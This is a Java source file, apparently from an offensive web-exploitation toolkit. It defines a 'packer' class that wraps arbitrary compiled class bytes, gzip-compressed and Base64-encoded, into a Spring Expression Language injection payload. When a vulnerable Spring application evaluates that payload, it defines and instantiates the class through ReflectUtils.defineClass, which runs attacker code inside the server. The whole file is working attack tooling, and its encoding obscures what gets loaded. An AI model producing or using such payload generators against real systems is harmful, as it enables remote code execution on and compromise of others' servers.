package com.reajason.javaweb.packer.spel;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import lombok.SneakyThrows;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;


/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class SpELSpringIOUtilsGzipPacker implements Packer {
    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()";

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", Base64.getEncoder().encodeToString(gzipCompress(config.getClassBytes())));
    }

    public static byte[] gzipCompress(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (GZIPOutputStream gzip = new GZIPOutputStream(out)) {
            gzip.write(data);
        }
        return out.toByteArray();
    }
}